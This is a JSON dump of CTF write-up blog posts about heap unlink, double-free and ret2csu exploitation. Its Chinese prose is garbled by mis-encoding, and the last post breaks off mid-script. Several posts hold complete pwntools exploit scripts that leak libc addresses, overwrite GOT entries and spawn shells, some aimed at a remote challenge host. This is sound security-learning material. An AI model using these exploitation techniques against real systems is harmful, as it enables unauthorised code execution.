{"posts":[{"title":"ctfwiki-unlinkâ€”2014 HITCON stkof","content":"é€šè¿‡è¿™ä¸ªé¢˜ç›®å†æ¥å­¦ä¹ ä¸‹unlink é€†å‘ mainå‡½æ•°ï¼Œä¸€æ ·æ˜¯ä¸ªèœå•é¢˜ï¼Œä½†æ˜¯æ¯”è¾ƒå‘çš„æ˜¯æ²¡ç»™èœå•ï¼Œåªèƒ½é ç”¨æˆ·æ¥é€†å‘å‡ºå…¶åŠŸèƒ½ __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int index; // eax signed int v5; // [rsp+Ch] [rbp-74h] char nptr; // [rsp+10h] [rbp-70h] unsigned __int64 v7; // [rsp+78h] [rbp-8h] v7 = __readfsqword(0x28u); alarm(0x78u); while ( fgets(&amp;nptr, 10, stdin) ) { index = atoi(&amp;nptr); if ( index == 2 ) { v5 = sub_4009E8(); goto LABEL_14; } if ( index &gt; 2 ) { if ( index == 3 ) { v5 = sub_400B07(); goto LABEL_14; } if ( index == 4 ) { v5 = sub_400BA9(); goto LABEL_14; } } else if ( index == 1 ) { v5 = sub_400936(); goto LABEL_14; } v5 = -1; LABEL_14: if ( v5 ) puts(&quot;FAIL&quot;); else puts(&quot;OK&quot;); fflush(stdout); } return 0LL; } addå †å—åŠŸèƒ½ï¼š å…¶ä¸­heaparrayåœ¨0x602140å¤„ signed __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *mem_ptr; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); mem_ptr = (char *)malloc(size); if ( !mem_ptr ) return 0xFFFFFFFFLL; ::s[++dword_602100] = mem_ptr; printf(&quot;%d\\n&quot;, (unsigned int)dword_602100, size); return 0LL; } freeï¼š no UAF signed __int64 sub_400B07() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v1 = atol(&amp;s); if ( v1 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v1] ) return 0xFFFFFFFFLL; free(::s[v1]); ::s[v1] = 0LL; return 0LL; } edit:å¯ä»¥ä»»æ„ä¿®æ”¹å †å—sizeï¼Œé€ æˆä»»æ„å †æº¢å‡º signed __int64 sub_4009E8() { signed __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); index = atol(&amp;s); if ( index &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[index] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = ::s[index]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result; } IO ç¼“å†²åŒºé—®é¢˜åˆ†æ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºç¨‹åºæœ¬èº«æ²¡æœ‰è¿›è¡Œ setbuf æ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œè¾“å…¥è¾“å‡ºæ“ä½œçš„æ—¶å€™ä¼šç”³è¯·ç¼“å†²åŒºã€‚è¿™é‡Œç»è¿‡æµ‹è¯•ï¼Œä¼šç”³è¯·ä¸¤ä¸ªç¼“å†²åŒºï¼Œåˆ†åˆ«å¤§å°ä¸º 1024 å’Œ 1024ã€‚å…·ä½“å¦‚ä¸‹ï¼Œå¯ä»¥è¿›è¡Œè°ƒè¯•æŸ¥çœ‹ åˆæ¬¡è°ƒç”¨ fgets æ—¶ï¼Œmalloc ä¼šåˆ†é…ç¼“å†²åŒº 1024 å¤§å°ã€‚ åˆ«ç®¡æˆ‘è¯´çš„å•¥ï¼Œè°ƒè¯•å°±å®Œäº† exp æ€è·¯ï¼šåˆ©ç”¨unlinkä¿®æ”¹heaparray[0][1][2]ï¼Œçœ‹expå§ from pwn import * p = process('./stkof') elf = ELF('./stkof') libc = ELF('./libc.so.6') def add(size): p.sendline('1') p.sendline(str(size)) def edit(index,size,content): p.sendline('2') p.sendline(str(index)) p.sendline(str(size)) p.send(content) def delete(index): p.sendline('3') p.sendline(str(index)) add(0x10) #chunk1ï¼šå¯¹æŠ—ç¼“å†²åŒº add(0x30) #chunk2 add(0x80) #chunk3 add(0x10) #chunk4 ptr = 0x602140 fd = ptr + 0x10 - 0x18 bk = ptr + 0x10 - 0x10 fake_chunk = p64(0) fake_chunk += p64(0x31) fake_chunk += p64(fd) fake_chunk += p64(bk) fake_chunk += p64(0) * 2 fake_chunk += p64(0x30) fake_chunk += p64(0x90) edit(2,len(fake_chunk),fake_chunk) delete(3) print(&quot;ç°åœ¨ä¿®æ”¹heaparray[0][1][2] åˆ†åˆ«ä¸ºfreeï¼Œputså’Œatoi&quot;) payload = p64(0) payload += p64(elf.got['free']) payload += p64(elf.got['puts']) payload += p64(elf.got['atoi']) edit(2,len(payload),payload) print(&quot;ç°åœ¨ä¿®æ”¹freeçš„å€¼ä¸ºputsï¼Œç„¶åfree(1),å°±æ˜¯puts(1)ï¼Œå³è¾“å‡ºputsçš„çœŸå®åœ°å€&quot;) payload = p64(elf.plt['puts']) edit(0,8,payload) delete(1) #context.log_level = 'debug' puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8,b'\\x00')) print(&quot;puts addr ----&gt; &quot; + hex(puts_addr)) print(&quot;ç»è¿‡è°ƒè¯•ç®—å‡ºæ¥ç›¸å¯¹å·®å€¼ä¸º0x67860,ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€è¿‘libcè€ä¸å‡†&quot;) libc_base = puts_addr - 0x67860 print(&quot;libc ---&gt; &quot; + hex(libc_base)) system_addr = libc_base + 0x3f550 paylaod = p64(system_addr) edit(2,8,paylaod) p.sendline(&quot;sh&quot;) p.interactive() ","link":"https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"},{"title":"unlinkåˆ©ç”¨â€”hitcontraining_unlink","content":"unlink ç®€å•è¯´ä¸€ä¸‹å§ï¼Œä¸è¯´å¤ªå¤šäº†ï¼Œæ¯”è¾ƒç´¯äº† æ€»ç»“ä¸€ä¸‹ (åªè®¨è®º2.23ç‰ˆæœ¬çš„libcä¸‹çš„unlink) åˆ©ç”¨æ¡ä»¶ ä¸€ä¸ªæŒ‡å‘heapçš„æŒ‡é’ˆï¼Œåœ¨bssæ®µä¸Šä¹‹ç±»çš„ï¼Œæœ€å¥½æ²¡å¼€pieï¼Œå°±æ¯”è¾ƒè½»æ¾ç‚¹å„¿ ç„¶åè¿˜éœ€è¦å †æº¢å‡ºæˆ–è€…UAFï¼Œç›®çš„éƒ½æ˜¯æ”¹å†™smallbin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ æ•ˆæœ ä½¿å¾—å·²æŒ‡å‘chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18 é€šç”¨æ€è·¯ è®¾æŒ‡å‘å¯ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptr ä¿®æ”¹ fd ä¸º ptr - 0x18 ä¿®æ”¹ bk ä¸º ptr - 0x10 è§¦å‘ unlink æ›´è¯¦ç»†çš„æ€è·¯ï¼š ä»¥èƒ½å¤Ÿè¿›è¡Œå †æº¢å‡ºçš„åœºæ™¯ä¸‹è¯´æ˜ï¼š 1ï¼Œç”³è¯·ä¸‰ä¸ªå †å—012ï¼Œ0ç”¨æ¥æº¢å‡ºï¼Œ1ç”¨æ¥ä½œä¸ºunsorted binï¼Œ2ç”¨æ¥ä¿æŠ¤ 2ï¼Œä¼ªé€ chunk0ï¼Œä¼ªé€ fdå’Œbkä¹‹ç±»çš„ï¼Œç„¶ååˆ©ç”¨å †æº¢å‡ºæ¥æ”¹å†™chunk1çš„prevsizeå’Œsizeçš„inuse 3ï¼Œfree1ï¼Œè§¦å‘unlink 4ï¼Œæ‰¾bssæ®µä¸Šçš„å…¨å±€æŒ‡é’ˆï¼Œçœ‹çœ‹å‘¨å›´æ€ä¹ˆåˆ©ç”¨ï¼Œæ¯”å¦‚æ”¹gotè¡¨ è§£é¢˜ é€†å‘ ä¸çœ‹äº†ï¼Œç®€å•é€†å‘ï¼Œæ¼æ´ä½äºåœ¨editä¸­ï¼Œå¯ä»¥ä»»æ„ä¿®æ”¹é•¿åº¦ï¼Œè€æ¼æ´äº† æ€è·¯ï¼Œä¼ªé€ chunkï¼Œç„¶åunlinkåˆ°bsså¤„ï¼Œæ”¹å†™heaparrayåˆ°free@gotï¼Œç„¶åä¿®æ”¹ä¸ºsystem ä¸‹å›¾ä¸ºatoiï¼Œä¸€å¼€å§‹æ˜¯ä¿®æ”¹atoiä¸ºsystemï¼Œç„¶åè¾“å…¥shæ‹¿åˆ°shellï¼Œæœ¬åœ°å¯ä»¥æ‰“é€šï¼Œä½†æ˜¯è¿œç¨‹å°±ä¸è¡Œäº†ï¼Œqswl è¿˜æœ‰libcsearcherï¼Œæˆ‘çš„libcsearcheråƒå¨å±ä¸€æ ·è¯¯å·®å°±nimaç¦»è°±ï¼Œè‰ exp from pwn import * from LibcSearcher import * #r=process('bamboobox') #r=remote('node3.buuoj.cn',28011) elf=ELF('../hitcontraining_unlink/bamboobox') r = process('../hitcontraining_unlink/bamboobox') def alloc(length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the name of item:&quot;) r.send(context) def edit(idx,length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the new name of the item:&quot;) r.send(context) def free(idx): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) def show(): r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) alloc(0x30,'bbbb') alloc(0x30,'bbbb') alloc(0x80,'cccc') alloc(0x20,'/bin/sh\\x00') glo=0x6020c8+0x10 fd=glo-0x18 bk=glo-0x10 payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+b'a'*0x10+p64(0x30)+p64(0x90) edit(1,len(payload),payload) free(2) free_got=elf.got['free'] log.info(&quot;free_got:%x&quot;,free_got) payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got) #print payload1 edit(1,len(payload),payload1) show() #log.info(&quot;got:%s&quot;,r.recv()) free_addr=u64(r.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, b'\\x00')) log.info(&quot;free_addr:%x&quot;,free_addr) libc=LibcSearcher('free',free_addr) libc_base=free_addr-libc.dump('free') log.info(&quot;libc_addr:%x&quot;,libc_base) system_addr=libc_base+libc.dump('system') log.info(&quot;system_addr:%x&quot;,system_addr) edit(1,0x8,p64(system_addr)) pause() free(3) r.interactive() è¢«ç¯å¢ƒæ¶å¿ƒæ­»äº†ï¼Œæœ¬åœ°çš„cccc ","link":"https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/"},{"title":"gyctf_2020_some_thing_exceting","content":"ç¬¬ä¸€æ¬¡å°è¯•äº†è¾¹åšé¢˜è¾¹å†™wpï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥ä½¿è‡ªå·±æ€è·¯æ›´å¼€é˜”ï¼Œå¾ˆä¸é”™ è¿™ä¸ªé¢˜è‡ªå·±æ²¡åšå‡ºæ¥ åŸå› ï¼šptmallocç®¡ç†æœºåˆ¶è¿˜æ˜¯ä¸ç†Ÿæ‚‰ï¼Œæ²¡æœ‰æƒ³èµ·æ¥double freeçš„åˆ©ç”¨æ¡ä»¶ï¼ˆè„‘å­æŠ½äº†ï¼Œä¸çŸ¥é“å½“æ—¶æƒ³çš„ä»€ä¹ˆ é€†å‘å’Œè§£é¢˜ä¸­çš„æ€è·¯ mainå‡½æ•° r_startå‡½æ•° å¯ä»¥å‘ç°è¿™ä¸ªå‡½æ•°è¦æ±‚åœ¨æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼Œè¦ä¸ç„¶å°±exitäº†ï¼Œæ‰€ä»¥æœ¬åœ°åšé¢˜çš„æ—¶å€™è¦åˆ›å»ºä¸€ä¸‹ ç„¶åè¿˜å¯ä»¥å‘ç°è¿™ä¸ªbssæ®µä¸­æœ‰ä¸ªå˜é‡è²Œä¼¼å¾ˆå¯ç–‘ï¼ŒåæœŸå…³æ³¨ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä¼ªé€ chunkå•¥çš„ addå‡½æ•° è¿™ä¸ªç¨‹åºæ²¡æœ‰editåŠŸèƒ½ delete åˆæ­¥åˆ†ææ˜¯æœ‰UAFæ´ show æˆ‘ä»¬ç›´æ¥æ–°å»ºä¸¤ä¸ªå †å—ï¼Œçœ‹ä¸€ä¸‹å†…å­˜åˆ†å¸ƒæ˜¯ä»€ä¹ˆæ ·å­çš„ from pwn import * local = 1 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x20,'AAAAAAAA',0x30,'BBBBBBBB') add(0x10,'aaaaaaaa',0x50,'bbbbbbbb') pause() çœ‹ä¸€ä¸‹chunkåˆ†å¸ƒ å¯ä»¥åˆæ­¥åˆ¤å®šï¼Œç»¿è‰²æ¡†æ¡†æ¡†èµ·æ¥çš„chunkæ˜¯ç®¡ç†åé¢ä¸¤ä¸ªbaå’Œnaçš„chunk ä½†æ˜¯å‰é¢ä¸¤ä¸ªéå¸¸å¤§çš„chunkæš‚æ—¶å°±ä¸çŸ¥é“æ˜¯ç”¨æ¥åšä»€ä¹ˆçš„äº† åˆ†å¸ƒå¾ˆæ¸…æ™° åˆšåˆšå‘ç°ï¼Œflagè¢«å­˜åˆ°äº†bssçš„ä¸€ä¸ªæ•°ç»„é‡Œé¢ï¼Œè§r_startå‡½æ•° è€Œä¸”bssæ®µçš„åˆ†å¸ƒå¾ˆæœ‰æ„æ€ heap[] byte_6020A0 (96) s[] (flag) è¿™ä¸ªç»“æ„åç»­è‚¯å®šå¯ä»¥åˆ©ç”¨ å¯ä»¥çœ‹åˆ°ï¼Œfreeåçš„æ•°æ®åŒºåŸŸå·²ç»è¢«æ¸…ç©º æˆ‘ç°åœ¨çš„æ€è·¯æ˜¯æ—¢ç„¶ç¨‹åºæœ¬èº«å¥½åƒæ²¡æœ‰æ¼æ´ï¼Œé‚£ä¹ˆè‚¯å®šä¸èƒ½å‘æ‹¿shellçš„æ€è·¯å»è¿›è¡Œäº† é‚£æˆ‘ä»¬ä¸å¦¨å°±è€ƒè™‘ä¿¡æ¯æ³„æ¼è¿™ä¸ªé€”å¾„ï¼Œæˆ‘ä»¬å¯ä¸å¯ä»¥åˆ©ç”¨double freeå‘¢ï¼Ÿå°è¯•æ”¹å†™fdæŒ‡é’ˆåˆ°byte_6020A0çš„ä½ç½®å¤„ï¼Œç„¶åshowæ‰“å°å†…å®¹ï¼Œå› ä¸ºbssæ®µé‚£æ ·çš„å†…å­˜åˆ†å¸ƒï¼Œä¸€ä¸ªå¯ä»¥æ³„æ¼å‡ºflagï¼Œæœ¬åœ°è°ƒè¯•ä¸€ä¸‹ å®éªŒä¸€ä¸‹å‘ç°ä¸å¯å–ï¼Œå› ä¸ºfreeåå°†å†…å®¹æ¸…ç©ºäº† é‚£ä¹ˆè¿˜æœ‰ä¸€ä¸ªæ€è·¯æ˜¯å› ä¸ºæˆ‘ä»¬æœ‰å †ç®¡ç†æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥æ”¹å†™æŒ‡é’ˆåˆ°bssæ®µå‘¢ï¼Ÿå†åº¦å°è¯•ä¸€ä¸‹ è¿™ç§æ€è·¯ä¹Ÿå¤±è´¥äº†ï¼Œå› ä¸ºå‘ç°æ— æ³•è¿›è¡Œæº¢å‡ºï¼Œè¿ç©ºå­—èŠ‚éƒ½æ— æ³•æº¢å‡º æ€è·¯ä¸‰ï¼šæˆ–è®¸ä¹‹å‰å¤§chunké‡Œé¢æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæˆ‘ä»¬ä¸å¦¨çœ‹çœ‹ å¥½å§ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆç„æœºï¼Œæˆ‘å‡†å¤‡çœ‹wpäº†:( å¼€å¹•é›·å‡»ï¼Œå‘ç°wpåˆ©ç”¨çš„æ˜¯double freeï¼Œä½†æ˜¯åœ¨ç¬¬ä¸€ä¸ªæ€è·¯é‡Œæˆ‘å¤±è´¥äº†ï¼Œæœ¬åœ°double freeä¼šæŠ¥é”™ï¼Ÿ oh no æˆ‘å‚»äº†ï¼Œdouble freeçš„åˆ©ç”¨æ¡ä»¶æ˜¯å‰åfreeçš„ä¸¤ä¸ªchunksizeè¦ç›¸åŒï¼Œè¿™æ ·åœ¨biné‡Œé¢æ‰ä¼šè¿æ¥èµ·æ¥ï¼Œcaoï¼Œæˆ‘æ˜¯sb è¿™æ ·å²‚ä¸æ˜¯ç®€å•å¾ˆå¤šäº†ï¼Ÿï¼Ÿæ·¦ï¼Œæœ¬æ¥å¯ä»¥è‡ªå·±å‡ºçš„ï¼Œç®—äº†ï¼Œåæ­£æ²¡çœ‹expï¼Œè‡ªå·±å†™expå¥½äº† å¯ä»¥çœ‹åˆ°å·²ç»å½¢æˆé—­ç¯äº†ï¼Œè‡³äºä¸ºå•¥é€‰0x60ï¼Œæ˜¯å› ä¸ºbssæ®µä¸Šé‚£ä¸ªæ•°å€¼æ˜¯96 å·²ç»ä¼ªé€ æˆåŠŸäº† exp from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x30,'AAAAAAAA',0x50,'BBBBBBBB') #chunk0 add(0x30,'aaaaaaaa',0x50,'bbbbbbbb') #chunk1 delete('0') delete('1') delete('0') bss_6020A0 = 0x6020A0 - 0x8 add(0x50,p64(bss_6020A0),0x50,'A') #chunk2 add(0x50,'B',0x50,'C') #chunk3 show('3') print(p.recv()) p.interactive() ","link":"https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/"},{"title":"ret2csuâ€”ç¼©çŸ­payload","content":"èµ·å› æ˜¯è¿™æ ·çš„ï¼Œè·Ÿä¸€ä¸ªpwnå¸ˆå‚…èŠå¤©çš„æ—¶å€™ï¼Œä»–å‘ç»™æˆ‘äº†ä¸€é“é¢˜ï¼Œè¯´å¾ˆæœ‰æ„æ€ï¼Œæˆ‘å°±æ‰“å¼€æ¥çœ‹äº†çœ‹ mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;welcome~\\n&quot;, 9uLL); vul(); return 0; } vulå‡½æ•° ssize_t vul() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x100uLL); } å°±è¿™ï¼Ÿ æˆ‘ä»–å¦ˆç›´æ¥ret2csu å…ˆå†™ä¸€ä¸‹åŸç†å§ï¼Œåˆ°æ—¶å€™å¤ä¹ æ¯”è¾ƒæ–¹ä¾¿ ret2csu __libc_csu_init é‡ç‚¹å…³æ³¨è¿™ä¸ªå‡½æ•° ä¸ºå•¥å‘¢ï¼Œå› ä¸ºå®ƒé‡Œé¢æœ‰å¾ˆå¥½çš„gadget æˆ‘ä»¬çŸ¥é“åœ¨64ä½ç¯å¢ƒä¸‹ï¼Œå‰å…­ä¸ªå‚æ•°æ˜¯ç”±å¯„å­˜å™¨æ¥ä¼ é€’çš„ï¼Œåˆ†åˆ«æ˜¯rdi rsi rdx rcx r8 r9 é‚£æˆ‘ä»¬çœ‹è¿™ä¸¤ä¸ªç‰‡æ®µ ç¬¬ä¸€ä¸ªæ˜¯popç‰‡æ®µ .text:000000000040060A pop rbx .text:000000000040060B pop rbp .text:000000000040060C pop r12 .text:000000000040060E pop r13 .text:0000000000400610 pop r14 .text:0000000000400612 pop r15 .text:0000000000400614 retn è¿™ä¸€ä¸²popå’Œretnåˆ†åˆ«æ‰“åˆ°äº†å¯„å­˜å™¨ä¸Šç„¶åè¿˜èƒ½retnï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„æ˜¯é‚£å…­ä¸ªå¯„å­˜å™¨ï¼Œä½†æ˜¯çœ‹å‰ä¸€ä¸ªç‰‡æ®µ .text:00000000004005F0 mov rdx, r13 .text:00000000004005F3 mov rsi, r14 .text:00000000004005F6 mov edi, r15d .text:00000000004005F9 call qword ptr [r12+rbx*8] æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è°ƒæ•´å¯„å­˜å™¨è¿™æ ·ediï¼Œrsiï¼Œrdxå‰ä¸‰ä¸ªå¯„å­˜å™¨ä¾¿å¯ä»¥ç”±æˆ‘ä»¬æ¥æ§åˆ¶äº† åˆ©ç”¨ æˆ‘ä»¬çœ‹ctfwiki ç„¶åwikiç»™äº†ä¸€ä¸ªå‡ ä¹ä¸‡èƒ½çš„exp from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF('./level5') sh = process('./level5') write_got = level5.got['write'] read_got = level5.got['read'] main_addr = level5.symbols['main'] bss_base = level5.bss() csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1) sh.recvuntil('Hello, World\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(sh.recv(8)) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') execve_addr = libc_base + libc.dump('execve') log.success('execve_addr ' + hex(execve_addr)) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh.recvuntil('Hello, World\\n') csu(0, 1, read_got, 16, bss_base, 0, main_addr) sh.send(p64(execve_addr) + '/bin/sh\\x00') sh.recvuntil('Hello, World\\n') ## execve(bss_base+8) csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr) sh.interactive() è¿™ä¸ªæ¥æ³„æ¼libcæ˜¯é€šè¿‡writeå‡½æ•°ï¼Œéš¾åº¦ä¸Šæ¥è¯´æ¯”putsè¦æ›´éš¾äº† æ€è·¯å°±æ˜¯å…ˆæ³„æ¼libcï¼Œç„¶ååŠ«æŒreadå‡½æ•°ï¼Œå‘bssæ®µä¸Šå†™å…¥/bin/shï¼Œå’Œsystemä¹‹ç±»çš„ç³»ç»Ÿå‡½æ•°ï¼Œç„¶ååŠ«æŒç¨‹åºæµåˆ°bssæ®µæ‹¿shell è§£é¢˜ é‚£æˆ‘ä»¬ç›´æ¥ç…§æŠ„expå°±å¥½äº†ï¼Œåæ­£å¤§åŒå°å¼‚ï¼ˆæ‰“è„¸ from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060A def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' payload = b'a' * 0x88 payload += p64(0x40060A) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.recvuntil('~\\n') p.send(payload) p.send(p64(execve)) p.send('/bin/sh\\0') sleep(1) #p.send(p64(execve) + b'/bin/sh\\x00') æƒ³è±¡æ˜¯ç¾å¥½çš„ï¼Œä½†æ˜¯å¾ˆå¿«å°±å‘ç°äº†é—®é¢˜ ç¨‹åºæ ¹æœ¬æ— æ³•è·³è½¬åˆ°mainå‡½æ•°ï¼Œæ€è€ƒäº†å¥½ä¹…å°±æ˜¯æ²¡æƒ³é€š åæ¥ç»è¿‡å¸ˆå‚…æé†’å‘ç°payloadé•¿åº¦è¶…äº† åªå…è®¸read 0x100ä¸ªå­—èŠ‚ï¼Œé‚£æˆ‘ä»¬åªå¥½ç¼©å‡payload ç»è¿‡è°ƒè¯•å‘ç°rbxå¯„å­˜å™¨æœ¬æ¥å°±æ˜¯0ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœç•¥p64(rbx)ï¼Œç»“æœå‘ç°é•¿åº¦æ­£å¥½ä¸º0x100 ç„¶åç¬¬äºŒæ¬¡å‘bsså†™æ•°æ®çš„æ—¶å€™å°±åˆä¸è¡Œäº†ï¼Œè¿™ä¸ªæ—¶å€™rbxå°±ä¸æ˜¯0äº† æ‰€ä»¥æ¢ä¸ªæ€è·¯ï¼Œå°±ç”¨æ™®é€šæ ˆæº¢å‡ºçš„æ€è·¯ï¼Œæ‰¾åˆ°binshå’Œsystemçš„åœ°å€ï¼Œç›´æ¥æ‰§è¡Œ ç”±äºæˆ‘æœ¬åœ°çš„ç¯å¢ƒæœ‰å¾ˆå¤§é—®é¢˜ï¼ŒLibcSearcherä¸å‡†ï¼Œæ¯æ¬¡åç§»éƒ½å·®0x1000ï¼Œæˆ‘é€šè¿‡gdbçš„magicæ‰¾åˆ°äº†systemçš„åœ°å€ï¼Œä½†æ˜¯å®åœ¨æ‰¾ä¸åˆ°binshçš„åœ°å€äº†ï¼Œæ‰€ä»¥å°±æ­¤ä½œç½¢ï¼Œä½†æ˜¯ç†è®ºä¸Šæ˜¯ç»å¯¹å¯ä»¥æ‰“é€šçš„ æˆ‘è´´ä¸€ä¸‹æœ€åçš„exp from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060B def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more 